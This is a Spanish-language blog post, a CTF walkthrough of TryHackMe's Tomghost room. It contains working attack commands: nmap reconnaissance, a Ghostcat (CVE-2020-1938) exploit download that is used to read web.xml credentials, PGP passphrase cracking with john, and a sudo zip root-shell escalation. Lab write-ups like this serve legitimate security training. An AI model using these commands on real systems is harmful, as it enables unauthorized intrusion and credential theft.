@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='https://tryhackme.com/room/tomghost
+IP Atacante = 10.10.10.10
+IP Víctima = 10.10.126.65
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+❯ ping -c 1 10.10.126.65 PING 10.10.126.65 (10.10.126.65) 56(84) bytes of data. 64 bytes from 10.10.126.65: icmp_seq=1 ttl=63 time=53.0 ms --- 10.10.126.65 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.964/52.964/52.964/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows.'>
+<title>Resolución Tomghost</title>
+
+<link rel='canonical' href='https://d3b0o.github.io/p/resoluci%C3%B3n-tomghost/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Resolución Tomghost'>
+<meta property='og:description' content='https://tryhackme.com/room/tomghost
+IP Atacante = 10.10.10.10
+IP Víctima = 10.10.126.65
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+❯ ping -c 1 10.10.126.65 PING 10.10.126.65 (10.10.126.65) 56(84) bytes of data. 64 bytes from 10.10.126.65: icmp_seq=1 ttl=63 time=53.0 ms --- 10.10.126.65 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.964/52.964/52.964/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows.'>
+<meta property='og:url' content='https://d3b0o.github.io/p/resoluci%C3%B3n-tomghost/'>
+<meta property='og:site_name' content='d3b0o'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Fácil' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='CVE-2020-1938' /><meta property='article:published_time' content='2022-12-29T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-29T00:00:00&#43;00:00'/><meta property='og:image' content='https://d3b0o.github.io/p/resoluci%C3%B3n-tomghost/images/portada.png' />
+<meta name="twitter:title" content="Resolución Tomghost">
+<meta name="twitter:description" content="https://tryhackme.com/room/tomghost
+IP Atacante = 10.10.10.10
+IP Víctima = 10.10.126.65
+Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+❯ ping -c 1 10.10.126.65 PING 10.10.126.65 (10.10.126.65) 56(84) bytes of data. 64 bytes from 10.10.126.65: icmp_seq=1 ttl=63 time=53.0 ms --- 10.10.126.65 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.964/52.964/52.964/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://d3b0o.github.io/p/resoluci%C3%B3n-tomghost/images/portada.png' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-WKTZJ16NWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-WKTZJ16NWQ', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "dark");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/me_hu8ce9295535d46137a41121f9fb5616e1_5792_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">d3b0o</a></h1>
+            <h2 class="site-description">CTF Player, Cybersecurity enthusiast</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://discord.gg/h455Yfm7cA'
+                        target="_blank"
+                        title="Discord"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg fill="#FFFFFF" xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 64 64" width="48px" height="48px"><path d="M 28.541016 12.441406 C 21.305016 13.049406 15.693359 16.132812 15.693359 16.132812 C 15.693359 16.132812 8 24.196828 8 39.423828 L 8 44.294922 L 9.8164062 45.478516 C 15.655406 49.284516 19.816594 51.212891 22.183594 51.212891 L 24.287109 51.212891 L 27.035156 47.21875 C 28.545156 47.48475 30.227 47.666016 32 47.666016 C 33.773 47.666016 35.453844 47.48475 36.964844 47.21875 L 39.712891 51.212891 L 41.816406 51.212891 C 44.183406 51.212891 48.344594 49.283516 54.183594 45.478516 L 56 44.294922 L 56 39.423828 C 56 24.379828 48.306641 16.132812 48.306641 16.132812 C 48.306641 16.132813 43.048031 13.140406 35.457031 12.441406 L 34.248047 14.732422 C 33.572047 14.675422 32.812047 14.636719 31.998047 14.636719 C 31.184047 14.636719 30.425047 14.676422 29.748047 14.732422 L 28.541016 12.441406 z M 26.3125 16.787109 L 27.523438 19.083984 C 27.523437 19.083984 29.449953 18.638672 32.001953 18.638672 C 34.553953 18.638672 36.478516 19.083984 36.478516 19.083984 L 37.689453 16.787109 C 41.593453 17.326109 45.820312 19.373047 45.820312 19.373047 C 45.820312 19.373047 52 26.530828 52 39.423828 L 52 42.126953 C 52 42.126953 44.194453 47.213891 41.814453 47.212891 L 39.507812 43.857422 C 40.941812 43.215422 42.898438 42.099609 42.898438 42.099609 L 42.183594 41.546875 C 42.183594 41.546875 37.609047 43.664062 31.998047 43.664062 C 26.387047 43.664063 21.814453 41.546875 21.814453 41.546875 L 21.099609 42.099609 C 21.099609 42.099609 23.056234 43.215422 24.490234 43.857422 L 22.183594 47.212891 C 19.805594 47.212891 12 42.126953 12 42.126953 L 12 39.423828 C 12 26.530828 18.181641 19.373047 18.181641 19.373047 C 18.181641 19.373047 22.4085 17.325109 26.3125 16.787109 z M 24.009766 29.044922 C 21.649766 29.044922 19.734375 31.194703 19.734375 33.845703 C 19.734375 36.497703 21.649766 38.646484 24.009766 38.646484 C 26.369766 38.646484 28.283203 36.497703 28.283203 33.845703 C 28.283203 31.193703 26.369766 29.044922 24.009766 29.044922 z M 39.990234 29.044922 C 37.629234 29.044922 35.716797 31.194703 35.716797 33.845703 C 35.716797 36.497703 37.630234 38.646484 39.990234 38.646484 C 42.351234 38.646484 44.265625 36.497703 44.265625 33.845703 C 44.265625 31.193703 42.351234 29.044922 39.990234 29.044922 z"/></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/d3b0o'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg fill="#FFFFFF" xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 64 64" width="48px" height="48px"><path d="M 32 10 C 19.85 10 10 19.85 10 32 C 10 44.15 19.85 54 32 54 C 44.15 54 54 44.15 54 32 C 54 19.85 44.15 10 32 10 z M 32 14 C 41.941 14 50 22.059 50 32 C 50 40.238706 44.458716 47.16934 36.904297 49.306641 C 36.811496 49.1154 36.747844 48.905917 36.753906 48.667969 C 36.784906 47.458969 36.753906 44.637563 36.753906 43.601562 C 36.753906 41.823563 35.628906 40.5625 35.628906 40.5625 C 35.628906 40.5625 44.453125 40.662094 44.453125 31.246094 C 44.453125 27.613094 42.554688 25.720703 42.554688 25.720703 C 42.554688 25.720703 43.551984 21.842266 42.208984 20.197266 C 40.703984 20.034266 38.008422 21.634812 36.857422 22.382812 C 36.857422 22.382813 35.034 21.634766 32 21.634766 C 28.966 21.634766 27.142578 22.382812 27.142578 22.382812 C 25.991578 21.634813 23.296016 20.035266 21.791016 20.197266 C 20.449016 21.842266 21.445312 25.720703 21.445312 25.720703 C 21.445312 25.720703 19.546875 27.611141 19.546875 31.244141 C 19.546875 40.660141 28.371094 40.5625 28.371094 40.5625 C 28.371094 40.5625 27.366329 41.706312 27.265625 43.345703 C 26.675939 43.553637 25.872132 43.798828 25.105469 43.798828 C 23.255469 43.798828 21.849984 42.001922 21.333984 41.169922 C 20.825984 40.348922 19.7845 39.660156 18.8125 39.660156 C 18.1725 39.660156 17.859375 39.981656 17.859375 40.347656 C 17.859375 40.713656 18.757609 40.968484 19.349609 41.646484 C 20.597609 43.076484 20.574484 46.292969 25.021484 46.292969 C 25.547281 46.292969 26.492043 46.171872 27.246094 46.068359 C 27.241926 47.077908 27.230199 48.046135 27.246094 48.666016 C 27.251958 48.904708 27.187126 49.114952 27.09375 49.306641 C 19.540258 47.168741 14 40.238046 14 32 C 14 22.059 22.059 14 32 14 z"/></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='#'
+                        target="_blank"
+                        title="PayPal"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg fill="#FFFFFF" xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 64 64" width="48px" height="48px"><path d="M 21.193359 10 C 17.999359 9.998 16.790687 11.666891 16.304688 13.962891 C 14.873688 20.712891 10.576172 40.962891 10.576172 40.962891 C 10.000172 42.999891 10.999797 47 15.466797 47 L 19.302734 47 L 18.816406 49.15625 C 17.999406 51.99925 20.000125 55 23.703125 55 L 28.496094 55 C 30.852094 55 32.883813 53.415937 33.382812 51.210938 L 34.964844 46.380859 C 35.032844 46.025859 35.926 45 37 45 L 42 45 C 45.522 45 48.832312 43.610844 51.320312 41.089844 C 53.735312 38.642844 55.041047 35.470203 54.998047 32.158203 C 54.924728 26.555952 51.856527 21.372267 46.472656 20.246094 C 45.364903 14.644546 41.218812 10.001498 36.003906 10.013672 C 36.003906 10.013672 24.895359 10.002 21.193359 10 z M 21.193359 14 L 35.636719 14 C 39.069942 14 41.395721 16.643375 42.320312 20.011719 L 29.431641 20 C 27.096641 20 25.040922 21.594969 24.544922 23.792969 L 20.207031 43 L 15.466797 43 C 15.051797 43 14.090328 42.949969 14.486328 41.792969 L 20.214844 14.792969 C 20.312844 14.333969 20.723359 14 21.193359 14 z M 29.431641 24 L 42.720703 24 C 42.120402 29.369368 35.800674 32 33.480469 32 L 26.792969 32 L 28.447266 24.673828 C 28.534266 24.289828 28.957641 24 29.431641 24 z M 46.666016 24.648438 C 49.264867 25.927319 50.95499 28.939349 50.998047 32.210938 C 51.028047 34.445937 50.131609 36.600297 48.474609 38.279297 C 46.742609 40.033297 44.444 41 42 41 L 37 41 C 34.035 41 31.579359 43.285656 31.068359 45.472656 L 29.484375 50.304688 C 29.408375 50.700687 28.983094 51 28.496094 51 L 23.703125 51 C 23.000125 51 22.661703 50.297109 22.720703 50.037109 L 25.890625 36 L 33.480469 36 C 36.775335 36 45.64394 32.531911 46.666016 24.648438 z"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#reconocimiento">Reconocimiento</a>
+      <ol>
+        <li><a href="#escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</a></li>
+        <li><a href="#puerto-8009">Puerto 8009</a></li>
+      </ol>
+    </li>
+    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>
+      <ol>
+        <li><a href="#merlin">Merlin</a></li>
+        <li><a href="#root">Root</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/resoluci%C3%B3n-tomghost/">
+                <img src="/p/resoluci%C3%B3n-tomghost/images/portada.png"
+                        
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Tomghost" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: #D65F41; color: #fff;">
+                THM
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/resoluci%C3%B3n-tomghost/">Resolución Tomghost</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 29, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://tryhackme.com/room/tomghost"  target="_blank" rel="noopener"
+    >https://tryhackme.com/room/tomghost</a></p>
+<p>IP Atacante = 10.10.10.10</p>
+<p>IP Víctima = 10.10.126.65</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
+<pre><code class="language-bash">❯ ping -c 1 10.10.126.65
+PING 10.10.126.65 (10.10.126.65) 56(84) bytes of data.
+64 bytes from 10.10.126.65: icmp_seq=1 ttl=63 time=53.0 ms
+
+--- 10.10.126.65 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 52.964/52.964/52.964/0.000 ms
+</code></pre>
+<p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
+<h3 id="escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</h3>
+<p>Ahora empezamos con un escaneo de puertos</p>
+<pre><code class="language-bash">nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.126.65 -oG allPorts
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-p-</td>
+<td>Para que el escaneo sea a todos los puertos (65536)</td>
+</tr>
+<tr>
+<td>&ndash;open</td>
+<td>Para que solo reporte los puertos abiertos</td>
+</tr>
+<tr>
+<td>-sS &ndash;min-rate 5000</td>
+<td>Definir el tiempo del escaneo</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>Omitir resolución DNS</td>
+</tr>
+<tr>
+<td>-vvv</td>
+<td>Para que vaya reportando lo que encuentre por consola</td>
+</tr>
+<tr>
+<td>-Pn</td>
+<td>Skip host discovery</td>
+</tr>
+<tr>
+<td>-oG allPorts</td>
+<td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td>
+</tr>
+</tbody>
+</table></div>
+<p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p>
+<p><a class="link" href="https://pastebin.com/tYpwpauW"  target="_blank" rel="noopener"
+    >Función extractPorts</a> de <a class="link" href="https://s4vitar.github.io"  target="_blank" rel="noopener"
+    >@s4vitar</a></p>
+<pre><code class="language-bash">❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.126.65
+   5   │     [*] Open ports: 22,53,8009,8080
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+<p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
+<pre><code class="language-bash">❯ nmap -p22,53,8009,8080 -sC -sV 10.10.126.65
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
+|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
+|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)
+53/tcp   open  tcpwrapped
+8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http       Apache Tomcat 9.0.30
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/9.0.30
+</code></pre>
+<h3 id="puerto-8009">Puerto 8009</h3>
+<p>Con searchsploit podemos buscar si existe algún exploit para ajp</p>
+<pre><code>❯ searchsploit ajp
+-------------------------------------------------------- ---------------------------------
+ Exploit Title                                          |  Path
+-------------------------------------------------------- ---------------------------------
+Apache Tomcat - AJP 'Ghostcat File Read/Inclusion       | multiple/webapps/48143.py
+Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Met | multiple/webapps/49039.rb
+-------------------------------------------------------- ---------------------------------
+</code></pre>
+<p>Al probar con el 48143.py no funciona bien.
+E encontrado otro exploit de 00theway <a class="link" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487"  target="_blank" rel="noopener"
+    >https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p>
+<pre><code class="language-bash">wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py
+python3 ajpShooter.py http://10.10.126.65 8009 /WEB-INF/web.xml read
+</code></pre>
+<p>En una línea específica un usuario y una contraseña</p>
+<pre><code>&lt;description&gt;
+     Welcome to GhostCat
+	skyfuck:--pass--
+&lt;/description&gt;
+</code></pre>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<h3 id="merlin">Merlin</h3>
+<p>Con ssh ya nos podemos conectar como skyfuck. Al entrar lo primero que vemos son dos archivos: <strong>credential.pgp</strong> y <strong>tryhackme.asc</strong>, con un <code>cat tryhackme.asc</code> podemos ver que contiene una <strong>pgp private key</strong> con la cual podemos ver el contenido de <strong>credential.pgp</strong>.</p>
+<pre><code class="language-bash">gpg --import tryhackme.asc
+gpg --decrypt credential.pgp
+</code></pre>
+<p>Nos pide una <em>passphrase</em></p>
+<p>Con python nos vamos a montar un servidor en la máquina víctima para pasarnos el archivo tryhackme.asc a nuestra máquina con <code>python3 -m http.server</code> y desde nuestra máquina con wget nos lo pasamos <code>wget http://10.10.126.65:8000/tryhackme.asc</code></p>
+<p>Desde nuestra máquina vamos a sacar el hash con</p>
+<pre><code>gpg2john tryhackme.asc &gt; hash
+</code></pre>
+<p>Ahora ya podemos mediante el diccionario rockyou.txt hacer fuerza bruta y encontrar la <em>passphrase</em></p>
+<pre><code>john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash
+</code></pre>
+<p>Nos encuentra las passphrase, ahora ya podemos aceder al  credentials.pgp y ver las credenciales de el usuario merlin.</p>
+<p>Dentro de la carpeta personal de merlin podemos ver la flag user.txt.</p>
+<h3 id="root">Root</h3>
+<p>Con un sudo -l podemos ver que puede ejecutar zip como root sin proporcionar contraseña, nos podemos aprovechar de esto de la siguiente forma.</p>
+<pre><code>TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+</code></pre>
+<p>Ahora ya somos root y podemos ver la flag en /root/root.txt</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/f%C3%A1cil/">Fácil</a>
+        
+            <a href="/tags/linux/">Linux</a>
+        
+            <a href="/tags/cve-2020-1938/">CVE-2020-1938</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-wgel/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-wgel/images/2.ce0967ca6b0dead5b9edaef85b680e16.png" 
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Wgel"
+                        
+                        data-hash="md5-zglnymsN6tW57a74W2gOFg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Wgel</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-gallery/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-gallery/images/3.842e0cbcf1200fcbe132473e900380c4.png" 
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Gallery"
+                        
+                        data-hash="md5-hC4MvPEgD8vhMkc&#43;kAOAxA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Gallery</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-ctf-mr.robot/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-ctf-mr.robot/images/1.6c74e5eac131228fdae2cbe1c551fd4f.jpg" 
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución CTF Mr.Robot"
+                        
+                        data-hash="md5-bHTl6sExIo/a4svhxVH9Tw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución CTF Mr.Robot</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-agent-t/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-agent-t/images/1.18faf70b1ffa54aa3aecc1174c6d9767.jpg" 
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Agent T"
+                        
+                        data-hash="md5-GPr3Cx/6VKo67MEXTG2XZw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Agent T</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-walkthrough-vulnversity/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-walkthrough-vulnversity/images/1.6d8dd25184c450b84269bbba10df64ea.jpg" 
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Walkthrough Vulnversity"
+                        
+                        data-hash="md5-bY3SUYTEULhCabu6EN9k6g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Walkthrough Vulnversity</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "d3b0o" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 d3b0o
+    </section>
+    
+    <section class="powerby">
+        Creado con <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
